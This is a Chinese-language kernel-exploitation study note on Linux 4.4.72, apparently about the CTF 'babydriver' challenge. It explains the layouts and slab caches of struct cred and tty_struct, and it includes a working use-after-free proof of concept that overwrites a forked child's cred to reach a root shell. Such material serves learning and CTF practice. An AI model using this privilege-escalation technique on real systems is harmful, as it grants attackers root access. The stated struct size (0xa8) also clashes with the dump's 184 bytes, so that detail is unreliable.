环境是 linux 4.4.72，比较老的一个版本。

## 结构体总结

### cred

当创建一个新进程时，内核会为其申请一个 struct cred 结构体，用于存放进程信息。

cred 结构体内容如下：

```c
// 结构体大小 0xa8
struct cred {
	atomic_long_t              usage;                /*     0     8 */
	kuid_t                     uid;                  /*     8     4 */
	kgid_t                     gid;                  /*    12     4 */
	kuid_t                     suid;                 /*    16     4 */
	kgid_t                     sgid;                 /*    20     4 */
	kuid_t                     euid;                 /*    24     4 */
	kgid_t                     egid;                 /*    28     4 */
	kuid_t                     fsuid;                /*    32     4 */
	kgid_t                     fsgid;                /*    36     4 */
	unsigned int               securebits;           /*    40     4 */
	
	/* XXX 4 bytes hole, try to pack */
	
	kernel_cap_t               cap_inheritable;      /*    48     8 */
	kernel_cap_t               cap_permitted;        /*    56     8 */
	/* --- cacheline 1 boundary (64 bytes) --- */
	kernel_cap_t               cap_effective;        /*    64     8 */
	kernel_cap_t               cap_bset;             /*    72     8 */
	kernel_cap_t               cap_ambient;          /*    80     8 */
	unsigned char              jit_keyring;          /*    88     1 */
	
	/* XXX 7 bytes hole, try to pack */
	
	struct key *               session_keyring;      /*    96     8 */
	struct key *               process_keyring;      /*   104     8 */
	struct key *               thread_keyring;       /*   112     8 */
	struct key *               request_key_auth;     /*   120     8 */
	/* --- cacheline 2 boundary (128 bytes) --- */
	void *                     security;             /*   128     8 */
	struct user_struct *       user;                 /*   136     8 */
	struct user_namespace *    user_ns;              /*   144     8 */
	struct ucounts *           ucounts;              /*   152     8 */
	struct group_info *        group_info;           /*   160     8 */
	union {
		int                non_rcu;              /*   168     4 */
		struct callback_head rcu;                /*   168    16 */
	};                                               /*   168    16 */

/* size: 184, cachelines: 3, members: 26 */
/* sum members: 173, holes: 2, sum holes: 11 */
/* last cacheline: 56 bytes */
};
```

最常见的打法就是把这个结构体的 uid / gid / suid / sgid 等全部改成 0，使得该子进程拥有root权限。

不过这个结构体在内核 4.5 之后，会使用单独的 叫做 `cred_jar` 的 kmem-cache 来独立分配，普通的 UAF 无法拿到这个结构体，也就没办法打了。


举个例子，在 `_do_fork` 上下断点，`fork` 函数会调用 `prepare_creds` 为子进程创建 cred 结构体，而 `prepare_creds` 会调用 `kmem_cache_alloc`：

![fork调用栈](https://pic1.imgdb.cn/item/68ecc757c5157e1a886c8f20.png)

然后 `p (struct kmem_cache)*0xffff880002c01800` 可以观察到这个函数是从 `kmalloc-192` 取 obj 的。

poc 如下：

```c
#include <kernel.h>

int main() {
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);
    ioctl(fd1, 0x10001, 0xa8);
    close(fd1);  // uaf
    pid_t pid = fork();
    if (pid < 0) {
        error("fork failed, pid = %d", pid);
    } else if (pid == 0) {
        info("child pid => %d", getpid());
        char zero[30] = {0};
        write(fd2, zero, 28);
        if (getuid() == 0) {
            success("getshell");
            system("/bin/sh");
        }
    } else {
        wait(NULL);
    }
    close(fd2);
    return 0;
}
```


### tty_struct


当用户态执行open("dev/ptmx",2); 或者open("/dev/ptmx", O_RDWR | O_NOCTTY)后，内核中的处理过程如下图所示：

![tty_struct 分配流程](https://pic1.imgdb.cn/item/68ecca5fc5157e1a886c9eca.png)

其中，`alloc_tty_struct` 会从 `kmalloc-1024` 里取 obj 以满足 `tty_struct` 的 0x2e0 的内存需求。

